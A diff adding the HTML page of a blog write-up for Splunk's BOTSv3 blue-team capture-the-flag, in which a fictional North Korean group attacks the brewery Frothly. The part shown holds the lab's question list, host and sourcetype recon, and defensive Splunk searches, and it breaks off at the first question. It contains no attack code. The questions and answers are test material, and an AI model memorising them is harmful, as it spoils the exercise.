@@ -1,0 +1,1553 @@
+<!DOCTYPE html>
+<html>
+
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <title> Splunk BOTSv3 Write-Up &middot; user@james ~ $ </title>
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.90.0" />
+
+
+
+
+<script src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="http://localhost:1313/css/nix.css">
+
+
+<link rel="stylesheet" href="http://localhost:1313/css/styles.css">
+
+
+<script src=http://localhost:1313/js/lunr-search.js></script>
+<script src=http://localhost:1313/js/lunr.js></script>
+
+
+
+<link rel="shortcut icon" href="http://localhost:1313/favicon.ico">
+
+
+
+<link href="https://fonts.googleapis.com/css?family=Inconsolata%7COpen+Sans%7CConcert+One" rel="stylesheet">
+
+
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4T1FV3DWGP"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4T1FV3DWGP');
+</script>
+
+
+
+<script type="application/ld+json">
+    {
+        "@context" : "http://schema.org",
+        "@type" : "BlogPosting",
+        "mainEntityOfPage": {
+             "@type": "WebPage",
+             "@id": "http:\/\/localhost:1313\/"
+        },
+        "articleSection" : "articles",
+        "name" : "Splunk BOTSv3 Write-Up",
+        "headline" : "Splunk BOTSv3 Write-Up",
+        "description" : "Splunk have several \u0026ldquo;Boss of the SOC\u0026rdquo; datasets, simulating a security incident - think of it as a Blue Team\/SIEM-based CTF. This is my write-up for BOTSv3, at the time of writing the most recent dataset available. It seems that Taedonggang, a North Korean group, have attacked Frothly, a beer maker\u0026hellip;\nThe official BOTSv3 page is here: https:\/\/github.com\/splunk\/botsv3\n I wrote this on Notion, and it is best viewed there, as it is always up-to-date and is visually best.",
+        "inLanguage" : "en-US",
+        "author" : "",
+        "creator" : "",
+        "publisher": "",
+        "accountablePerson" : "",
+        "copyrightHolder" : "",
+        "copyrightYear" : "2020",
+        "datePublished": "2020-09-08 00:00:00 \u002b0000 UTC",
+        "dateModified" : "2020-09-08 00:00:00 \u002b0000 UTC",
+        "url" : "http:\/\/localhost:1313\/articles\/digital-forensics\/botsv3\/",
+        "wordCount" : "8530",
+        "keywords" : [ "Blog" ]
+    }
+</script>
+    </head>
+
+    <body>
+        <header>
+<nav class="navbar navbar-default navbar-fixed-top navbar-inverse font-header">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+      <a class="navbar-brand" id="green-terminal" href='http://localhost:1313/'>
+        @james ~ $
+      </a>
+		</div>
+
+		
+		<div class="collapse navbar-collapse" id="navbar-collapse-1">
+			<ul class="nav navbar-nav navbar-right">
+				<li>
+					<a href='http://localhost:1313/'>/home/</a>
+        </li>
+        
+				
+				
+				<li class="dropdown">
+                    
+            		<a href="http://localhost:1313/about">~/about</a>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+            		<a href="http://localhost:1313/achievements">~/achievements</a>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+                        <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">articles <span class="caret"></span></a>
+                    <ul class="dropdown-menu">
+                        
+                    		<li>
+                    		<a href="http://localhost:1313/articles/digital-forensics">~/digital-forensics</a>
+				    		</li>
+                		
+                    		<li>
+                    		<a href="http://localhost:1313/articles/offensive-security">~/offensive-security</a>
+				    		</li>
+                		
+                    		<li>
+                    		<a href="http://localhost:1313/articles/operational-technology">~/operational-technology</a>
+				    		</li>
+                		
+                    		<li>
+                    		<a href="http://localhost:1313/articles/reviews">~/reviews</a>
+				    		</li>
+                		
+                    		<li>
+                    		<a href="http://localhost:1313/articles/security-operations">~/security-operations</a>
+				    		</li>
+                		
+            		</ul>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+            		<a href="http://localhost:1313/notes">~/notes</a>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+                        <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">projects <span class="caret"></span></a>
+                    <ul class="dropdown-menu">
+                        
+                    		<li>
+                    		<a href="http://localhost:1313/projects/arduino">~/arduino</a>
+				    		</li>
+                		
+                    		<li>
+                    		<a href="http://localhost:1313/projects/bash">~/bash</a>
+				    		</li>
+                		
+                    		<li>
+                    		<a href="http://localhost:1313/projects/python">~/python</a>
+				    		</li>
+                		
+            		</ul>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+            		<a href="http://localhost:1313/search">~/search</a>
+            		
+        		</li>
+        		
+
+			</ul>
+		</div>
+	</div>
+</nav>
+</header>
+
+        <div class="flex-wrapper">
+            <div class="container wrapper single">
+                <ol class="breadcrumb">
+  
+  
+    
+  
+    
+  
+    
+  
+  <li>
+    
+      <a href="/">james</a>
+    
+  </li>
+
+  
+  <li>
+    
+      <a href="/articles/">articles</a>
+    
+  </li>
+
+  
+  <li>
+    
+      <a href="/articles/digital-forensics/">digital forensics</a>
+    
+  </li>
+
+  
+  <li>
+    
+      Splunk BOTSv3 Write-Up
+    
+  </li>
+
+</ol>
+
+
+
+                <h1><a href="http://localhost:1313/articles/digital-forensics/botsv3/">Splunk BOTSv3 Write-Up</a></h1>
+                <span class="post-date">2020-09-08 </span>
+                <div class="post-content">
+                    <br/>
+<p>Splunk have several &ldquo;Boss of the SOC&rdquo; datasets, simulating a security incident - think of it as a Blue Team/SIEM-based CTF. This is my write-up for BOTSv3, at the time of writing the most recent dataset available. It seems that Taedonggang, a North Korean group, have attacked Frothly, a beer maker&hellip;</p>
+<p>The official BOTSv3 page is here: <a href="https://github.com/splunk/botsv3" target="_blank">https://github.com/splunk/botsv3</a></p>
+<hr>
+<p>I wrote this on Notion, and it is best viewed there, as it is always up-to-date and is visually best. See it here:</p>
+<ul>
+<li><a href="https://www.notion.so/jamesdeluk/BOTSv3-2f83c05e301b436bbdb5f4f006bfcd78" target="_blank">https://www.notion.so/jamesdeluk/BOTSv3-2f83c05e301b436bbdb5f4f006bfcd78</a></li>
+</ul>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p>Or available as a PDF:</p>
+<ul>
+<li><a href="https://drive.google.com/file/d/1SnVvJS-d1UGcp9bOgV7FtQM386C_rv_N/view?usp=sharing" target="_blank">PDF on Google Drive</a></li>
+</ul>
+<h2 id="contents">Contents</h2>
+<ul>
+<li><a href="#info">Info</a></li>
+<li><a href="#initial-recon">Initial Recon</a>
+<ul>
+<li><a href="#events">Events</a></li>
+<li><a href="#timeline">Timeline</a></li>
+<li><a href="#hosts-and-sourcetypes">Hosts and Sourcetypes</a></li>
+</ul>
+</li>
+<li><a href="#general-process">General Process</a></li>
+<li><a href="#questions">Questions</a>
+<ul>
+<li><a href="#200----list-out-the-iam-users-that-accessed-an-aws-service-successfully-or-unsuccessfully-in-frothlys-aws-environment">200 -|- List out the IAM users that accessed an AWS service (successfully or unsuccessfully) in Frothlys AWS environment?</a></li>
+<li><a href="#201----what-field-would-you-use-to-alert-that-aws-api-activity-have-occurred-without-mfa-multi-factor-authentication">201 -|- What field would you use to alert that AWS API activity have occurred without MFA (multi-factor authentication)?</a></li>
+<li><a href="#202----what-is-the-processor-number-used-on-the-web-servers">202 -|- What is the processor number used on the web servers?</a></li>
+<li><a href="#203----bud-accidentally-makes-an-s3-bucket-publicly-accessible-what-is-the-event-id-of-the-api-call-that-enabled-public-access">203 -|- Bud accidentally makes an S3 bucket publicly accessible. What is the event ID of the API call that enabled public access?</a></li>
+<li><a href="#204----what-is-the-name-of-the-s3-bucket-that-was-made-publicly-accessible">204 -|- What is the name of the S3 bucket that was made publicly accessible?</a></li>
+<li><a href="#205----what-is-the-name-of-the-text-file-that-was-successfully-uploaded-into-the-s3-bucket-while-it-was-publicly-accessible">205 -|- What is the name of the text file that was successfully uploaded into the S3 bucket while it was publicly accessible?</a></li>
+<li><a href="#206----what-is-the-size-in-megabytes-of-the-targz-file-that-was-successfully-uploaded-into-the-s3-bucket-while-it-was-publicly-accessible">206 -|- What is the size (in megabytes) of the .tar.gz file that was successfully uploaded into the S3 bucket while it was publicly accessible?</a></li>
+<li><a href="#208----a-frothly-endpoint-exhibits-signs-of-coin-mining-activity-what-is-the-name-of-the-first-process-to-reach-100-percent-cpu-processor-utilization-time-from-this-activity-on-this-endpoint">208 -|- A Frothly endpoint exhibits signs of coin mining activity. What is the name of the first process to reach 100 percent CPU processor utilization time from this activity on this endpoint?</a></li>
+<li><a href="#209----when-a-frothly-web-server-ec2-instance-is-launched-via-auto-scaling-it-performs-automated-configuration-tasks-after-the-instance-starts-how-many-packages-and-dependent-packages-are-installed-by-the-cloud-initialization-script">209 -|- When a Frothly web server EC2 instance is launched via auto scaling, it performs automated configuration tasks after the instance starts. How many packages and dependent packages are installed by the cloud initialization script?</a></li>
+<li><a href="#210----what-is-the-short-hostname-of-the-only-frothly-endpoint-to-actually-mine-monero-cryptocurrency">210 -|- What is the short hostname of the only Frothly endpoint to actually mine Monero cryptocurrency?</a></li>
+<li><a href="#211----how-many-cryptocurrency-mining-destinations-are-visited-by-frothly-endpoints">211 -|- How many cryptocurrency mining destinations are visited by Frothly endpoints?</a></li>
+<li><a href="#212----using-splunks-event-order-functions,-what-is-the-first-seen-signature-id-of-the-coin-miner-threat-according-to-frothlys-symantec-endpoint-protection-sep-data">212 -|- Using Splunks event order functions, what is the first seen signature ID of the coin miner threat according to Frothlys Symantec Endpoint Protection (SEP) data?</a></li>
+<li><a href="#213----according-to-symantecs-website-what-is-the-severity-of-this-specific-coin-miner-threat">213 -|- According to Symantecs website, what is the severity of this specific coin miner threat?</a></li>
+<li><a href="#214----what-is-the-short-hostname-of-the-only-frothly-endpoint-to-show-evidence-of-defeating-the-cryptocurrency-threat">214 -|- What is the short hostname of the only Frothly endpoint to show evidence of defeating the cryptocurrency threat?</a></li>
+<li><a href="#215----what-is-the-fqdn-of-the-endpoint-that-is-running-a-different-windows-operating-system-edition-than-the-others">215 -|- What is the FQDN of the endpoint that is running a different Windows operating system edition than the others?</a></li>
+<li><a href="#216----according-to-the-cisco-nvm-flow-logs-for-how-many-seconds-does-the-endpoint-generate-monero-cryptocurrency">216 -|- According to the Cisco NVM flow logs, for how many seconds does the endpoint generate Monero cryptocurrency?</a></li>
+<li><a href="#217----what-kind-of-splunk-visualization-was-in-the-first-file-attachment-that-bud-emails-to-frothly-employees-to-illustrate-the-coin-miner-issue">217 -|- What kind of Splunk visualization was in the first file attachment that Bud emails to Frothly employees to illustrate the coin miner issue?</a></li>
+<li><a href="#218----what-iam-user-access-key-generates-the-most-distinct-errors-when-attempting-to-access-iam-resources">218 -|- What IAM user access key generates the most distinct errors when attempting to access IAM resources?</a></li>
+<li><a href="#219----bud-accidentally-commits-aws-access-keys-to-an-external-code-repository-shortly-after-he-receives-a-notification-from-aws-that-the-account-had-been-compromised-what-is-the-support-case-id-that-amazon-opens-on-his-behalf">219 -|- Bud accidentally commits AWS access keys to an external code repository. Shortly after, he receives a notification from AWS that the account had been compromised. What is the support case ID that Amazon opens on his behalf?</a></li>
+<li><a href="#220----aws-access-keys-consist-of-two-parts-an-access-key-id-eg-akiaiosfodnn7example-and-a-secret-access-key-eg-wjalrxutnfemik7mdengbpxrficyexamplekey-what-is-the-secret-access-key-of-the-key-that-was-leaked-to-the-external-code-repository">220 -|- AWS access keys consist of two parts: an access key ID (e.g., AKIAIOSFODNN7EXAMPLE) and a secret access key (e.g., wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY). What is the secret access key of the key that was leaked to the external code repository?</a></li>
+<li><a href="#221----using-the-leaked-key-the-adversary-makes-an-unauthorized-attempt-to-create-a-key-for-a-specific-resource-what-is-the-name-of-that-resource">221 -|- Using the leaked key, the adversary makes an unauthorized attempt to create a key for a specific resource. What is the name of that resource?</a></li>
+<li><a href="#222----using-the-leaked-key-the-adversary-makes-an-unauthorized-attempt-to-describe-an-account-what-is-the-full-user-agent-string-of-the-application-that-originated-the-request">222 -|- Using the leaked key, the adversary makes an unauthorized attempt to describe an account. What is the full user agent string of the application that originated the request?</a></li>
+<li><a href="#223----the-adversary-attempts-to-launch-an-ubuntu-cloud-image-as-the-compromised-iam-user-what-is-the-codename-for-that-operating-system-version-in-the-first-attempt">223 -|- The adversary attempts to launch an Ubuntu cloud image as the compromised IAM user. What is the codename for that operating system version in the first attempt?</a></li>
+<li><a href="#224----frothly-uses-amazon-route-53-for-their-dns-web-service-what-is-the-average-length-of-the-distinct-third-level-subdomains-in-the-queries-to-brewertalkcom">224 -|- Frothly uses Amazon Route 53 for their DNS web service. What is the average length of the distinct third-level subdomains in the queries to brewertalk.com?</a></li>
+<li><a href="#225----using-the-payload-data-found-in-the-memcached-attack-what-is-the-name-of-the-jpeg-file-that-is-used-by-taedonggang-to-deface-other-brewery-websites">225 -|- Using the payload data found in the memcached attack, what is the name of the .jpeg file that is used by Taedonggang to deface other brewery websites?</a></li>
+<li><a href="#300----what-is-the-full-user-agent-string-that-uploaded-the-malicious-link-file-to-onedrive">300 -|- What is the full user agent string that uploaded the malicious link file to OneDrive?</a></li>
+<li><a href="#301----what-external-client-ip-address-is-able-to-initiate-successful-logins-to-frothly-using-an-expired-user-account">301 -|- What external client IP address is able to initiate successful logins to Frothly using an expired user account?</a></li>
+<li><a href="#302----according-to-symantecs-website-what-is-the-discovery-date-of-the-malware-identified-in-the-macro-enabled-file">302 -|- According to Symantecs website, what is the discovery date of the malware identified in the macro-enabled file?</a></li>
+<li><a href="#303----what-is-the-password-for-the-user-that-was-successfully-created-by-the-user-root-on-the-on-premises-linux-system">303 -|- What is the password for the user that was successfully created by the user root on the on-premises Linux system?</a></li>
+<li><a href="#304----what-is-the-name-of-the-user-that-was-created-after-the-endpoint-was-compromised">304 -|- What is the name of the user that was created after the endpoint was compromised?</a></li>
+<li><a href="#305----what-is-the-process-id-of-the-process-listening-on-a-leet-port">305 -|- What is the process ID of the process listening on a leet port?</a></li>
+<li><a href="#306----a-search-query-originating-from-an-external-ip-address-of-frothlys-mail-server-yields-some-interesting-search-terms-what-is-the-search-string">306 -|- A search query originating from an external IP address of Frothlys mail server yields some interesting search terms. What is the search string?</a></li>
+<li><a href="#307----what-is-the-md5-value-of-the-file-downloaded-to-fyodors-endpoint-system-and-used-to-scan-frothlys-network">307 -|- What is the MD5 value of the file downloaded to Fyodors endpoint system and used to scan Frothlys network?</a></li>
+<li><a href="#308----based-on-the-information-gathered-for-question-304-what-groups-was-this-user-assigned-to-after-the-endpoint-was-compromised">308 -|- Based on the information gathered for question 304, what groups was this user assigned to after the endpoint was compromised?</a></li>
+<li><a href="#309----at-some-point-during-the-attack-a-users-domain-account-is-disabled-what-is-the-email-address-of-the-user-whose-account-gets-disabled-and-what-is-the-email-address-of-the-user-who-disabled-their-account">309 -|- At some point during the attack, a users domain account is disabled. What is the email address of the user whose account gets disabled and what is the email address of the user who disabled their account?</a></li>
+<li><a href="#310----another-set-of-phishing-emails-were-sent-to-frothly-employees-after-the-adversary-gained-a-foothold-on-a-frothly-computer-this-malicious-content-was-detected-and-left-behind-a-digital-artifact-what-is-the-name-of-this-file">310 -|- Another set of phishing emails were sent to Frothly employees after the adversary gained a foothold on a Frothly computer. This malicious content was detected and left behind a digital artifact. What is the name of this file?</a></li>
+<li><a href="#311----based-on-the-answer-to-question-310-what-is-the-name-of-the-executable-that-was-embedded-in-the-malware">311 -|- Based on the answer to question 310, what is the name of the executable that was embedded in the malware?</a></li>
+<li><a href="#312----how-many-unique-ip-addresses-used-the-malicious-link-file-that-was-sent">312 -|- How many unique IP addresses used the malicious link file that was sent?</a></li>
+<li><a href="#314----what-port-number-did-the-adversary-use-to-download-their-attack-tools">314 -|- What port number did the adversary use to download their attack tools?</a></li>
+<li><a href="#315----during-the-attack-two-files-are-remotely-streamed-to-the-tmp-directory-of-the-on-premises-linux-server-by-the-adversary-what-are-the-names-of-these-files">315 -|- During the attack, two files are remotely streamed to the /tmp directory of the on-premises Linux server by the adversary. What are the names of these files?</a></li>
+<li><a href="#316----based-on-the-information-gathered-for-question-314-what-file-can-be-inferred-to-contain-the-attack-tools">316 -|- Based on the information gathered for question 314, what file can be inferred to contain the attack tools?</a></li>
+<li><a href="#317----what-is-the-first-executable-uploaded-to-the-domain-admin-accounts-compromised-endpoint-system">317 -|- What is the first executable uploaded to the domain admin accounts compromised endpoint system?</a></li>
+<li><a href="#318----from-what-country-is-a-small-brute-force-or-password-spray-attack-occurring-against-the-frothly-web-servers">318 -|- From what country is a small brute force or password spray attack occurring against the Frothly web servers?</a></li>
+<li><a href="#319----the-adversary-created-a-bcc-rule-to-forward-frothlys-email-to-his-personal-account-what-is-the-value-of-the-name-parameter-set-to">319 -|- The adversary created a BCC rule to forward Frothlys email to his personal account. What is the value of the Name parameter set to?</a></li>
+<li><a href="#320----what-is-the-password-for-the-user-that-was-created-on-the-compromised-endpoint">320 -|- What is the password for the user that was created on the compromised endpoint?</a></li>
+<li><a href="#321----the-taedonggang-adversary-sent-grace-hoppy-an-email-bragging-about-the-successful-exfiltration-of-customer-data-how-many-frothly-customer-emails-were-exposed-or-revealed">321 -|- The Taedonggang adversary sent Grace Hoppy an email bragging about the successful exfiltration of customer data. How many Frothly customer emails were exposed or revealed?</a></li>
+<li><a href="#322----what-is-the-path-of-the-url-being-accessed-by-the-command-and-control-server">322 -|- What is the path of the URL being accessed by the command and control server?</a></li>
+<li><a href="#323----at-least-two-frothly-endpoints-contact-the-adversarys-command-and-control-infrastructure-what-are-their-short-hostnames">323 -|- At least two Frothly endpoints contact the adversarys command and control infrastructure. What are their short hostnames?</a></li>
+<li><a href="#324----who-is-al-bungsteins-cell-phone-providercarrier">324 -|- Who is Al Bungsteins cell phone provider/carrier?</a></li>
+<li><a href="#325----microsoft-cloud-services-often-have-a-delay-or-lag-between-index-time-and-event-creation-time-for-the-entire-day-what-is-the-max-lag-in-minutes-for-the-sourcetype-msaadsignin">325 -|- Microsoft cloud services often have a delay or lag between index time and event creation time. For the entire day, what is the max lag, in minutes, for the sourcetype: ms:aad:signin?</a></li>
+<li><a href="#326----according-to-mallorys-advertising-research-how-is-beer-meant-to-be-enjoyed">326 -|- According to Mallorys advertising research, how is beer meant to be enjoyed?</a></li>
+<li><a href="#328----what-text-is-displayed-on-line-2-of-the-file-used-to-escalate-tomcat8s-permissions-to-root">328 -|- What text is displayed on line 2 of the file used to escalate tomcat8s permissions to root?</a></li>
+<li><a href="#329----one-of-the-files-uploaded-by-taedonggang-contains-a-word-that-is-a-much-larger-in-font-size-than-any-other-in-the-file-what-is-that-word">329 -|- One of the files uploaded by Taedonggang contains a word that is a much larger in font size than any other in the file. What is that word?</a></li>
+<li><a href="#330----what-frothly-vpn-user-generated-the-most-traffic">330 -|- What Frothly VPN user generated the most traffic?</a></li>
+<li><a href="#331----using-splunk-commands-only-what-is-the-upper-fence-uf-value-of-the-interquartile-range-iqr-of-the-count-of-event-code-4688-by-windows-hosts-over-the-entire-day-use-a-1.5-multiplier">331 -|- Using Splunk commands only, what is the upper fence (UF) value of the interquartile range (IQR) of the count of event code 4688 by Windows hosts over the entire day? Use a 1.5 multiplier.</a></li>
+<li><a href="#332----what-is-the-cve-of-the-vulnerability-that-escalated-permissions-on-linux-host-hoth">332 -|- What is the CVE of the vulnerability that escalated permissions on Linux host hoth?</a></li>
+<li><a href="#333----what-is-the-cve-of-the-vulnerability-that-was-exploited-to-run-commands-on-linux-host-hoth">333 -|- What is the CVE of the vulnerability that was exploited to run commands on Linux host hoth?</a></li>
+</ul>
+</li>
+<li><a href="#timeline">Timeline</a></li>
+<li><a href="#key-learnings">Key Learnings</a></li>
+</ul>
+<h2 id="info">Info</h2>
+<ul>
+<li>I used the downloadable BOTS VM from CyberDefenders - <a href="https://cyberdefenders.org/labs/8" target="_blank">https://cyberdefenders.org/labs/8</a>. Much easier than installing it all manually!</li>
+<li>As the dataset only includes the BOTSv3 data, all searches have <code>index=botsv3</code> omitted.</li>
+<li>Answers are not hidden. I think the process is more important than finding the correct answer, in this case.</li>
+<li>After completing the questions and this writeup, I went back to do some more discovery. These are found in the <strong>Bonus</strong> sections of related questions.</li>
+</ul>
+<h2 id="initial-recon">Initial Recon</h2>
+<h3 id="events">Events</h3>
+<p><code>| eventcount index=botsv3</code>: 2,030,269 events</p>
+<p><code>index=botsv3</code>: 2,798,824 events</p>
+<br/>
+<h3 id="timeline">Timeline</h3>
+<p><strong>Date</strong>: 20th August 2018</p>
+<p><strong>Time</strong>: Most between 0900 and 1600</p>
+<br/>
+<h3 id="hosts-and-sourcetypes">Hosts and Sourcetypes</h3>
+<p><strong>30 hosts</strong></p>
+<ul>
+<li>hoth</li>
+<li>serverless</li>
+<li>matar</li>
+<li>ABUNGST-L</li>
+<li>BGIST-L</li>
+<li>BSTOLL-L</li>
+<li>BTUN-L</li>
+<li>FYODOR-L</li>
+<li>JWORTOS-L</li>
+<li>MKRAEUS-L</li>
+<li>PCERF-L</li>
+<li>gacrux.i-06fea586f3d3c8ce8</li>
+<li>gacrux.i-0920036c8ca91e501</li>
+<li>gacrux.i-09cbc261e84259b54</li>
+<li>gacrux.i-0cc93bade2b3cba63</li>
+<li>mars.i-08e52f8b5a034012d</li>
+<li>ip-172-16-0-109.ec2.internal</li>
+<li>ip-172-16-0-127</li>
+<li>ip-172-16-0-13</li>
+<li>ip-172-16-0-145</li>
+<li>ip-172-16-0-178</li>
+<li>ip-172-31-12-76</li>
+<li>ip-172-31-36-235</li>
+<li>SEPM</li>
+<li>FROTHLY-FW1</li>
+<li>splunk.froth.ly</li>
+<li>splunkhwf.froth.ly</li>
+<li>console.us.code42.com:443</li>
+<li>ntesla (2 events, connection to botsv3.ministerofmayhem.com)</li>
+<li>OD-FM-NA-i-0ad2d665d4bdace22.amazonaws.com (1 event, error about Splunk)</li>
+</ul>
+<br/>
+<p><strong>107 sourcetypes</strong></p>
+<ul>
+<li>access_combined</li>
+<li>alternatives</li>
+<li>amazon-ssm-agent</li>
+<li>amazon-ssm-agent-too_small</li>
+<li>apache_error</li>
+<li>aws:cloudtrail</li>
+<li>aws:cloudwatch</li>
+<li>aws:cloudwatch:guardduty</li>
+<li>aws:cloudwatchlogs</li>
+<li>aws:cloudwatchlogs:vpcflow</li>
+<li>aws:config:rule</li>
+<li>aws:description</li>
+<li>aws:elb:accesslogs</li>
+<li>aws:rds:audit</li>
+<li>aws:rds:error</li>
+<li>aws:s3:accesslogs</li>
+<li>bandwidth</li>
+<li>bash_history</li>
+<li>bootstrap</li>
+<li>cisco:asa</li>
+<li>cloud-init</li>
+<li>cloud-init-output</li>
+<li>code42:api</li>
+<li>code42:computer</li>
+<li>code42:org</li>
+<li>code42:security</li>
+<li>code42:user</li>
+<li>config_file</li>
+<li>cpu</li>
+<li>cron-too_small</li>
+<li>df</li>
+<li>dmesg</li>
+<li>dpkg</li>
+<li>error-too_small</li>
+<li>errors</li>
+<li>errors-too_small</li>
+<li>ess_content_importer</li>
+<li>hardware</li>
+<li>history-2</li>
+<li>interfaces</li>
+<li>iostat</li>
+<li>lastlog</li>
+<li>linux_audit</li>
+<li>linux_secure</li>
+<li>localhost-5</li>
+<li>lsof</li>
+<li>maillog-too_small</li>
+<li>ms:aad:audit</li>
+<li>ms:aad:signin</li>
+<li>ms:o365:management</li>
+<li>ms:o365:reporting:messagetrace</li>
+<li>netstat</li>
+<li>o365:management:activity</li>
+<li>openports</li>
+<li>osquery:info</li>
+<li>osquery:results</li>
+<li>osquery:warning</li>
+<li>out-3</li>
+<li>package</li>
+<li>perfmonmk:process</li>
+<li>protocol</li>
+<li>ps</li>
+<li>script:getendpointinfo</li>
+<li>script:installedapps</li>
+<li>script:listeningports</li>
+<li>stream:arp</li>
+<li>stream:dhcp</li>
+<li>stream:dns</li>
+<li>stream:http</li>
+<li>stream:icmp</li>
+<li>stream:igmp</li>
+<li>stream:ip</li>
+<li>stream:mysql</li>
+<li>stream:smb</li>
+<li>stream:smtp</li>
+<li>stream:tcp</li>
+<li>stream:udp</li>
+<li>symantec:ep:agent:file</li>
+<li>symantec:ep:agt_system:file</li>
+<li>symantec:ep:behavior:file</li>
+<li>symantec:ep:packet:file</li>
+<li>symantec:ep:risk:file</li>
+<li>symantec:ep:scm_system:file</li>
+<li>symantec:ep:security:file</li>
+<li>symantec:ep:traffic:file</li>
+<li>syslog</li>
+<li>time</li>
+<li>top</li>
+<li>unix:listeningports</li>
+<li>unix:service</li>
+<li>unix:sshdconfig</li>
+<li>unix:update</li>
+<li>unix:uptime</li>
+<li>unix:useraccounts</li>
+<li>unix:version</li>
+<li>userswithloginprivs</li>
+<li>vmstat</li>
+<li>who</li>
+<li>wineventlog</li>
+<li>winhostmon</li>
+<li>xmlwineventlog:microsoft-windows-sysmon/operational</li>
+<li>yum-too_small</li>
+</ul>
+<br/>
+<p>Understanding what&rsquo;s what:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">| tstats values<span style="color:#f92672">(</span>sourcetype<span style="color:#f92672">)</span> by host
+| tstats values<span style="color:#f92672">(</span>host<span style="color:#f92672">)</span> by sourcetype
+
+| tstats count by host sourcetype | sort host -count
+| tstats count by sourcetype host | sort sourcetype -count
+</code></pre></div><br/>
+<p><strong>Functions</strong></p>
+<ul>
+<li><em>XXX-L</em> are Windows endpoints
+<ul>
+<li>8: ABUNGST-L, BGIST-L, BSTOLL-L, BTUN-L, FYODOR-L, JWORTOS-L, MKRAEUS-L, PCERF-L</li>
+<li>ABUNGST-L = ABUNGST-L.froth.ly = AzureAD\AlBungstein = <a href="mailto:abungstein@froth.ly">abungstein@froth.ly</a></li>
+</ul>
+</li>
+<li><em>gacrux.i-XXX</em> are Linux web (Apache) servers
+<ul>
+<li><em>gacrux.i-0920036c8ca91e501</em> more <code>stream:mysql</code> than others</li>
+</ul>
+</li>
+<li><em>mars.i-08e52f8b5a034012d</em> is Linux DNS/name server?</li>
+<li><em>matar</em> is the mail server?
+<ul>
+<li>Only host with <code>stream:smtp</code></li>
+</ul>
+</li>
+<li><em>hoth</em> is Linux DC?
+<ul>
+<li>Has several sourcetypes no other host has</li>
+</ul>
+</li>
+</ul>
+<br/>
+<p><strong>Limited-purpose hosts:</strong></p>
+<ul>
+<li><em>ip-172-16-0-109.ec2.internal</em>: AWS-related stream:XXX</li>
+<li><em>serverless</em>: AWS</li>
+<li><em>splunk.froth.ly</em>: AWS and Microsoft</li>
+<li><em>ip-172-31-36-235</em>: ms:o365:management</li>
+<li><em>sepm</em>: symantec (Symantec Endpoint Protection Management)</li>
+<li><em>frothly-fw1:</em> cisco:awa</li>
+<li><em>splunkhwf.froth.ly, ip-172-16-0-XXX, ip-172-31-12-76</em> are cisconvmflow:syslog
+<ul>
+<li>but hoth has more than all of them; ip-XXX have very few</li>
+</ul>
+</li>
+<li><em>console.us.code42.com:443</em>: code42</li>
+</ul>
+<h2 id="general-process">General Process</h2>
+<ol>
+<li>Search key phrases to find sources or sourcetypes</li>
+<li>Check fields for relevant information</li>
+</ol>
+<h2 id="questions">Questions</h2>
+<h3 id="200----list-out-the-iam-users-that-accessed-an-aws-service-successfully-or-unsuccessfully-in-frothlys-aws-environment">200 -|- List out the IAM users that accessed an AWS service (successfully or unsuccessfully) in Frothly&rsquo;s AWS environment?</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;*aws*&#34;</span> *IAM*
+</code></pre></div><p>Check fields. There&rsquo;s a <code>user_type</code> field in <code>aws:cloudtrail</code> with an option for <code>IAMUser</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aws:cloudtrail&#34;</span> user_type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;IAMUser&#34;</span>
+</code></pre></div><p>Then check the <code>userName</code> field for unique users.</p>
+<blockquote>
